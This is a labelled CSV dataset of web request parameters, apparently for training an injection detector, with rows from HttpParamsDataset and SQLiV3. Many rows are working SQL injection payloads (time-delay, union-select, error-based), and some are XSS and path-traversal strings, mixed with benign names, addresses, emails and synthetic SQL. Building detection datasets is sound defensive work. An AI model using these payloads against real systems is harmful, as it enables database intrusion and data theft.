payload,attack_type,is_attack,source
"1 where 1299=1299;select count(*) from generate_series(1,5000000)--",sqli,1,HttpParamsDataset
7058252446193830,norm,0,HttpParamsDataset
1  )   as jdhz where 2021  =  2021,sqli,1,SQLiV3
lupin colombo,norm,0,HttpParamsDataset
SELECT * FROM iron WHERE supply = 'least'  AND  ( advice = 'lot' OR party = 'potatoes' ) ,norm,0,SQLiV3
1%'   )    )     )   union all select null--,sqli,1,SQLiV3
SELECT COUNT ( stateID ) FROM account,norm,0,SQLiV3
93,norm,0,HttpParamsDataset
46960,norm,0,HttpParamsDataset
"   SELECT COUNT ( what ) , everybody FROM lot BY meant",norm,0,SQLiV3
"INSERT INTO mass ( gain, written, lunch, allow, might, prove )  VALUES  ( 'suit', 'root'. pressure', 'given', 'lose', 'writer', 'country' )  ",norm,0,SQLiV3
calle federico mompou 144 11-d,norm,0,HttpParamsDataset
SELECT COUNT ( special ) FROM west,norm,0,SQLiV3
sant hilari sacalm,norm,0,HttpParamsDataset
"1'   )    )    or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (   'acly' like 'acly",sqli,1,SQLiV3
calle tras do colexio s/n,norm,0,HttpParamsDataset
sandberg@3horas.tl,norm,0,HttpParamsDataset
"1 or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  -- ctdx",sqli,1,SQLiV3
-7864 or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   # twpw,sqli,1,SQLiV3
"1"" and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and ""xwnw""  =  ""xwnw",sqli,1,SQLiV3
"1'  )   where 5883  =  5883 or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",sqli,1,SQLiV3
"1'||(select 'zoqo' from dual where 2063=2063;select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",sqli,1,HttpParamsDataset
1%' rlike (select * from (select(sleep(5)))sgvo) and '%'=',sqli,1,HttpParamsDataset
"1') where 8348=8348 and elt(4249=4249,7259)--",sqli,1,HttpParamsDataset
"calle doctor bove, 65",norm,0,HttpParamsDataset
ret4ne3or,norm,0,HttpParamsDataset
SELECT power ( s )  FROM instant,norm,0,SQLiV3
SELECT TOP 3 * FROM knife SELECT * FROM wagon 3SELECT * FROM proper,norm,0,SQLiV3
halpin,norm,0,HttpParamsDataset
"  UPDATE original SET what =  'who', City =  'exciting' WHERE congress =  against",norm,0,SQLiV3
" SELECT column_name ( s )  FROM itself,atom",norm,0,SQLiV3
"1 where 3902=3902 or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",sqli,1,HttpParamsDataset
" SELECT * FROM sold ORDER BY should ASC, simple DESC",norm,0,SQLiV3
lamentante,norm,0,HttpParamsDataset
attilio,norm,0,HttpParamsDataset
7666460029738411,norm,0,HttpParamsDataset
"c/ salvatella, 98 11?h",norm,0,HttpParamsDataset
SELECT * FROM somewhere FETCH FIRST 50 PERCENT ROWS ONLY,norm,0,SQLiV3
5x8r0r,norm,0,HttpParamsDataset
-8023' in boolean mode) order by 1#,sqli,1,HttpParamsDataset
SELECT TOP 3 * FROM support,norm,0,SQLiV3
"1' where 5023  =  5023 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",sqli,1,SQLiV3
SELECT DISTINCT satisfied FROM book,norm,0,SQLiV3
201,norm,0,HttpParamsDataset
walker@ebaz.vi,norm,0,HttpParamsDataset
"1  )   or elt  (  5873  =  5873,sleep  (  5   )    )   #",sqli,1,SQLiV3
"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and 'ekhi'  =  'ekhi",sqli,1,SQLiV3
7686271480294625,norm,0,HttpParamsDataset
SELECT throw ( s FROM son RIGHT JOIN,norm,0,SQLiV3
SELECT smile,norm,0,SQLiV3
/.//..//.//..//.//..//.//..//.//..//.//..//.//..//.//..//{file},path-traversal,1,HttpParamsDataset
"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and    (    (     (  '%'  =  '",sqli,1,SQLiV3
-6912' in boolean mode  )   union all select 6012--,sqli,1,SQLiV3
SELECT TOP 3 * FROM copy WHERE out = 'cheese',norm,0,SQLiV3
-2717'))) or 8571=8571--,sqli,1,HttpParamsDataset
SELECT * FROM  ( SELECT wild FROM deeply ) ,norm,0,SQLiV3
"1"") and (select * from (select(sleep(5)))fzno) and (""ppml""=""ppml",sqli,1,HttpParamsDataset
"function,[{}][0].constructor._('alert(1)')()</script>",xss,1,HttpParamsDataset
"1') or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and ('iqvg'='iqvg",sqli,1,HttpParamsDataset
melbourn,norm,0,HttpParamsDataset
SELECT * FROM court WHERE his = 'perhaps',norm,0,SQLiV3
"1'))) and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)) and ((('txwf'='txwf",sqli,1,HttpParamsDataset
villanueva de la serena,norm,0,HttpParamsDataset
3829,norm,0,HttpParamsDataset
31383,norm,0,HttpParamsDataset
clara,norm,0,HttpParamsDataset
SELECT TOP 50 PERCENT * FROM ill,norm,0,SQLiV3
"1%"" or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and ""%""  =  """,sqli,1,SQLiV3
valsequillo de gran canaria,norm,0,HttpParamsDataset
"camino cementerio, s/n,",norm,0,HttpParamsDataset
tiziano,norm,0,HttpParamsDataset
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 8767 )  ORDER BY meta_id ASC",norm,0,SQLiV3
">""<script>document.cookie=true;//<</script>",xss,1,HttpParamsDataset
67,norm,0,HttpParamsDataset
SELECT * FROM notice WHERE attached NOT LIKE '[climb]%',norm,0,SQLiV3
1'||  (  select 'dezl' where 8661  =  8661,sqli,1,SQLiV3
monitor,norm,0,HttpParamsDataset
3674,norm,0,HttpParamsDataset
-2223'   )    )    as mjwp where 8650  =  8650 or 7900  =  5838,sqli,1,SQLiV3
45643261z,norm,0,HttpParamsDataset
"INSERT INTO motor ( gasoline, something, single, because, below, announced )  VALUES  ( 'gather', 'produce'. fight', 'chart', 'plate', 'meat', 'nose' )  ",norm,0,SQLiV3
"1%""   )    )     )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --",sqli,1,SQLiV3
SELECT DISTINCT impossible FROM breathing,norm,0,SQLiV3
end and    (    (   2160  =  2160,sqli,1,SQLiV3
nataliya,norm,0,HttpParamsDataset
"1"";select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4",sqli,1,HttpParamsDataset
" SELECT * FROM cake ORDER BY dug ASC, deep DESC",norm,0,SQLiV3
etxebarria,norm,0,HttpParamsDataset
SELECT AVG ( nine )  FROM actually  SELECT SUM ( writer ) ,norm,0,SQLiV3
"c/ puonrostro s/n,",norm,0,HttpParamsDataset
"1) where 1013=1013 and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--",sqli,1,HttpParamsDataset
"pablo de rojas, s/n,",norm,0,HttpParamsDataset
SELECT AVG ( balloon ) FROM pain SELECT SUM ( negative ) ,norm,0,SQLiV3
"nardo, 12, 13e",norm,0,HttpParamsDataset
SELECT * FROM heart FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM jar,norm,0,SQLiV3
SELECT AVG ( safety ) FROM able,norm,0,SQLiV3
1')) or 6793=(select 6793 from pg_sleep(5)) and (('qiau'='qiau,sqli,1,HttpParamsDataset
5854,norm,0,HttpParamsDataset
1347,norm,0,HttpParamsDataset
1%' or 4240=(select 4240 from pg_sleep(5))--,sqli,1,HttpParamsDataset
carrer de merida 35 8-c,norm,0,HttpParamsDataset
" select * from users where id  =  1 +  (  1  )   union select null,banner from v$version where rownum  =  1 -- 1",sqli,1,SQLiV3
"jana, la",norm,0,HttpParamsDataset
"  SELECT grandfatherID AS ID, friend AS edge FROM fact",norm,0,SQLiV3
"1');call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ('gsdq'='gsdq",sqli,1,HttpParamsDataset
2875083717333458,norm,0,HttpParamsDataset
"-9810') where 4361=4361 or elt(1032=1032,3623)--",sqli,1,HttpParamsDataset
"1'));select * from generate_series(4592,4592,case when (4592=4592) then 1 else 0 end) limit 1--",sqli,1,HttpParamsDataset
31830,norm,0,HttpParamsDataset
 (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and 'yfvu' like 'yfvu,sqli,1,SQLiV3
04211,norm,0,HttpParamsDataset
vilafams,norm,0,HttpParamsDataset
"-7295""  )   or 9323  =  9323#",sqli,1,SQLiV3
7207771074495103,norm,0,HttpParamsDataset
"1') union all select null,null,null,null--",sqli,1,HttpParamsDataset
"1""   )    )    as xcyo where 2929  =  2929",sqli,1,SQLiV3
"1')) as mjps where 2179=2179 union all select null,null,null,null,null,null,null--",sqli,1,HttpParamsDataset
"1%' or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and '%'='",sqli,1,HttpParamsDataset
"1  )   where 5598  =  5598 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",sqli,1,SQLiV3
" SELECT column_name ( s )  FROM reader,low",norm,0,SQLiV3
ciuffini@firstchoicecoffee.ge,norm,0,HttpParamsDataset
cajahuanca barberan,norm,0,HttpParamsDataset
1 and 6969  =    (  select 6969 from pg_sleep  (  5   )    ) ,sqli,1,SQLiV3
"1') where 7007=7007 or 7427=dbms_pipe.receive_message(chr(116)||chr(87)||chr(90)||chr(109),5)--",sqli,1,HttpParamsDataset
"1""  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  ""mlld"" like ""mlld",sqli,1,SQLiV3
marazuela,norm,0,HttpParamsDataset
"1'  )   or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and   (  'wgbh'  =  'wgbh",sqli,1,SQLiV3
">""<img src=""blah>"" onmouseover=""document.cookie=true;"">",xss,1,HttpParamsDataset
"-8005"") union all select 5213,5213,5213,5213,5213--",sqli,1,HttpParamsDataset
24645898h,norm,0,HttpParamsDataset
"1%"") and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (""%""=""",sqli,1,HttpParamsDataset
1')));select (case when (7980=3703) then 7980 else 7980*(select 7980 from information_schema.character_sets) end)#,sqli,1,HttpParamsDataset
48c49p59a,norm,0,HttpParamsDataset
"  SELECT improveID AS ID, attack AS eager FROM prevent",norm,0,SQLiV3
"1'));select count(*) from generate_series(1,5000000)--",sqli,1,HttpParamsDataset
"-4015'||  (  select 'qeqv' from dual where 1437  =  1437 union all select 1437,1437,1437,1437,1437,1437,1437,1437,1437#",sqli,1,SQLiV3
1') and 6969=(select 6969 from pg_sleep(5)),sqli,1,HttpParamsDataset
1%';select (case when (4660=4660) then 4660 else cast(1 as int)/(select 0 from dual) end) from dual--,sqli,1,HttpParamsDataset
"  UPDATE making SET had =  'know', City =  'means' WHERE mind =  object",norm,0,SQLiV3
1agostn,norm,0,HttpParamsDataset
regis@magritte.us,norm,0,HttpParamsDataset
select   (  case when   (  9907  =  2736  )   then 9907 else 9907*  (  select 9907 from mysql.db  )   end  )  #,sqli,1,SQLiV3
"1'  )   and elt  (  1407  =  6365,6365  )   and   (  'zckl'  =  'zckl",sqli,1,SQLiV3
hoggatt,norm,0,HttpParamsDataset
"1' and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and 'zjxk'='zjxk",sqli,1,HttpParamsDataset
"ruiz de alda, 78",norm,0,HttpParamsDataset
"1%""))) union all select null--",sqli,1,HttpParamsDataset
begin user_lock.sleep  (  5  ) ,sqli,1,SQLiV3
"-8608"" or 5460  =  4461--",sqli,1,SQLiV3
svenn-er,norm,0,HttpParamsDataset
"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  +'",sqli,1,SQLiV3
margaux,norm,0,HttpParamsDataset
SELECT * FROM my WHERE NOT of = 'minerals'  AND NOT people = 'reader',norm,0,SQLiV3
01139,norm,0,HttpParamsDataset
SELECT * FROM made WHERE Price NOT BETWEEN 10 AND 20,norm,0,SQLiV3
""" or benchmark  (  10000000,MD5  (  1   )    )   #",sqli,1,SQLiV3
"  SELECT coat,fought,cost FROM avoid LEFT JOIN Orders ON men.marriedID =  exchange.were ORDER BY finest.recognize",norm,0,SQLiV3
"calle carme karr, 65, 10a",norm,0,HttpParamsDataset
7913900000000000,norm,0,SQLiV3
"1')) as jmnw where 6496=6496 or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",sqli,1,HttpParamsDataset
1%'   )    )     )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and    (    (     (  '%'  =  ',sqli,1,SQLiV3
"-4397'))) or make_set(9354=9354,7185) and ((('omqt'='omqt",sqli,1,HttpParamsDataset
"c/ murillo, 106 5c",norm,0,HttpParamsDataset
mcglynn,norm,0,HttpParamsDataset
1;begin user_lock.sleep(5); end,sqli,1,HttpParamsDataset
15388,norm,0,HttpParamsDataset
"1""  )   as tuem where 1328  =  1328",sqli,1,SQLiV3
-6912' in boolean mode) union all select 6012--,sqli,1,HttpParamsDataset
50296685d,norm,0,HttpParamsDataset
canellas redolad,norm,0,HttpParamsDataset
"1',iif(6625=6625,1,1/0)",sqli,1,HttpParamsDataset
SELECT * FROM production,norm,0,SQLiV3
3260901599339838,norm,0,HttpParamsDataset
1' or (select * from (select(sleep(5)))ydpu) and 'ejdk' like 'ejdk,sqli,1,HttpParamsDataset
b129a97r,norm,0,HttpParamsDataset
"-9176')) as eunw where 5978=5978 or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",sqli,1,HttpParamsDataset
3244290959091087,norm,0,HttpParamsDataset
"1%') or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and ('%'='",sqli,1,HttpParamsDataset
"  SELECT * FROM local WHERE coffee NOT IN  ( 'moving', 'gold', 'directly' )  ",norm,0,SQLiV3
1  )   where 1487  =  1487,sqli,1,SQLiV3
SELECT * FROM not WHERE warn NOT LIKE '[tin]%',norm,0,SQLiV3
"  SELECT ROUND ( 135.375, 2 ) ;",norm,0,SQLiV3
"1"")) union all select null,null#",sqli,1,HttpParamsDataset
"1""   )    )     )   and 2006  =  2006",sqli,1,SQLiV3
"-4876""   )    )    as saug where 2256  =  2256 union all select 2256,2256,2256,2256,2256,2256,2256,2256,2256,2256--",sqli,1,SQLiV3
"1',(select (case when (7734=7734) then (select benchmark(5000000,md5(0x72747341))) else 7734*(select 7734 from mysql.db) end))",sqli,1,HttpParamsDataset
9304951385291211,norm,0,HttpParamsDataset
"1""   )    )     )   and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",sqli,1,SQLiV3
SELECT * FROM figure WHERE moving = 'view' LIMIT 3,norm,0,SQLiV3
"1'||  (  select 'xyrk' from dual where 9844  =  9844 and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",sqli,1,SQLiV3
"-8432  )   union all select 8169,8169,8169,8169,8169,8169,8169,8169,8169,8169--",sqli,1,SQLiV3
51285362p,norm,0,HttpParamsDataset
1' rlike sleep  (  5  )   and 'ojqz' like 'ojqz,sqli,1,SQLiV3
90660924f,norm,0,HttpParamsDataset
"c/ padilla, 74 12h",norm,0,HttpParamsDataset
"-7531'))) union all select 6900,6900,6900,6900,6900,6900,6900,6900,6900#",sqli,1,HttpParamsDataset
SELECT * FROM  ( SELECT announced FROM knew ) ,norm,0,SQLiV3
"1')) or 4915=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",sqli,1,HttpParamsDataset
"SELECT * FROM tonight WHERE came BETWEEN ""zoo"" AND    ""symbol""",norm,0,SQLiV3
1)) as pzoo where 8036=8036 or 6793=(select 6793 from pg_sleep(5))--,sqli,1,HttpParamsDataset
"1) as bhdj where 4472=4472;call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1,HttpParamsDataset
"salvador perles, 23,",norm,0,HttpParamsDataset
42361844f,norm,0,HttpParamsDataset
5975278199435199,norm,0,HttpParamsDataset
1) where 4548=4548 and 9198=9198--,sqli,1,HttpParamsDataset
mendiz espn,norm,0,HttpParamsDataset
-1393'))) union all select 8280--,sqli,1,HttpParamsDataset
ingrey,norm,0,HttpParamsDataset
07485924e,norm,0,HttpParamsDataset
"1'+(select kzgg where 5070=5070;select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",sqli,1,HttpParamsDataset
"INSERT INTO tree ( public, blank, wherever, shape, desert, funny )  VALUES  ( 'bow', 'pet'. train', 'gas', 'wish', 'vast', 'soap' )  ",norm,0,SQLiV3
42367,norm,0,HttpParamsDataset
"1%')));select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and ((('%'='",sqli,1,HttpParamsDataset
oficial ribe,norm,0,HttpParamsDataset
"select * from generate_series  (  9964,9964,case when   (  9964  =  4455  )   then 1 else 0 end  )   limit 1--",sqli,1,SQLiV3
1);select (case when (6276=6276) then 6276 else 6276*(select 6276 from information_schema.character_sets) end)#,sqli,1,HttpParamsDataset
chavez jofre,norm,0,HttpParamsDataset
1') where 6622=6622 order by 1--,sqli,1,HttpParamsDataset
03291016s,norm,0,HttpParamsDataset
"-8792 union all select 1246,1246,1246,1246,1246,1246,1246--",sqli,1,HttpParamsDataset
"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and    (    (   ""vfvh""  =  ""vfvh",sqli,1,SQLiV3
jawdokimov@manzanilladevillafafila.np,norm,0,HttpParamsDataset
"<html><body><?xml:namespace prefix=""t"" ns=""urn:schemas-microsoft-com:time""><?import namespace=""t"" implementation=""#default#time2""><t:set attributename=""innerhtml"" to=""crosssitescripting<script defer>document.cookie=true</script>""></body></html>",xss,1,HttpParamsDataset
montiel@sitienesunawebtienesunnegocio.cf,norm,0,HttpParamsDataset
1'   )    )     )   waitfor delay '0:0:5' and    (    (     (  'clcf'  =  'clcf,sqli,1,SQLiV3
-8828)) as ospo where 2141=2141 or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))--,sqli,1,HttpParamsDataset
"   SELECT adult, just, slowFROM agree WHERE go  IS NOT NULL",norm,0,SQLiV3
1')) and 6969=(select 6969 from pg_sleep(5)) and (('prjf'='prjf,sqli,1,HttpParamsDataset
"1');call regexp_substring(repeat(right(char(3702),0),500000000),null) and ('ahjo'='ahjo",sqli,1,HttpParamsDataset
1')) as pdrg where 5960=5960 and 9198=9198--,sqli,1,HttpParamsDataset
poomjai3@deuxmanagement.ch,norm,0,HttpParamsDataset
SELECT * FROM one FETCH FIRST 3 ROWS ONLY,norm,0,SQLiV3
06227,norm,0,HttpParamsDataset
bringu mulleras,norm,0,HttpParamsDataset
SELECT * FROM organized WHERE trunk  BETWEEN 10 AND 20,norm,0,SQLiV3
1));begin user_lock.sleep(5); end--,sqli,1,HttpParamsDataset
16127,norm,0,HttpParamsDataset
"calle de can castellvi 35, 10-h",norm,0,HttpParamsDataset
free,norm,0,HttpParamsDataset
candombe,norm,0,HttpParamsDataset
"1'   )    )    or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (   'aovy'  =  'aovy",sqli,1,SQLiV3
6803792379658242,norm,0,HttpParamsDataset
"1%""   )    )     )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and    (    (     (  ""%""  =  """,sqli,1,SQLiV3
1025489401142113,norm,0,HttpParamsDataset
1'+(select iowv where 6105=6105 and sleep(5)#,sqli,1,HttpParamsDataset
"1""   )    )     )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and    (    (     (  ""tpxo"" like ""tpxo",sqli,1,SQLiV3
"-3731'))) or elt(7540=1412,1412) and ((('iwch'='iwch",sqli,1,HttpParamsDataset
SELECT TOP 3 * FROM education,norm,0,SQLiV3
"  SELECT * FROM change WHERE newspaper IN  ( 'caught', 'ahead', 'pie' )  ",norm,0,SQLiV3
"1'  )   where 6388  =  6388 or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",sqli,1,SQLiV3
poli8l2a,norm,0,HttpParamsDataset
SELECT * FROM now WHERE process = 'treated' LIMIT 3,norm,0,SQLiV3
SELECT dollar,norm,0,SQLiV3
SELECT * FROM frame,norm,0,SQLiV3
SELECT * FROM blow ORDER BY cattle,norm,0,SQLiV3
"1;call regexp_substring(repeat(right(char(3702),0),500000000),null)# huhw",sqli,1,HttpParamsDataset
1)) and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and ((5139=5139,sqli,1,HttpParamsDataset
maheu,norm,0,HttpParamsDataset
"1)) as jrzr where 5194=5194 and char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1,HttpParamsDataset
tanchak,norm,0,HttpParamsDataset
SELECT AVG ( Price ) FROM sun,norm,0,SQLiV3
8otijo,norm,0,HttpParamsDataset
16118,norm,0,HttpParamsDataset
/../..//../..//{file},path-traversal,1,HttpParamsDataset
1')) or (select * from (select(sleep(5)))ydpu) and (('ytxg'='ytxg,sqli,1,HttpParamsDataset
" select * from users where id  =  1 or 1#""@ union select 1,version  (    )   -- 1",sqli,1,SQLiV3
"-2626%') or elt(7513=8586,8586) and ('%'='",sqli,1,HttpParamsDataset
"1"" where 7015  =  7015 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  --",sqli,1,SQLiV3
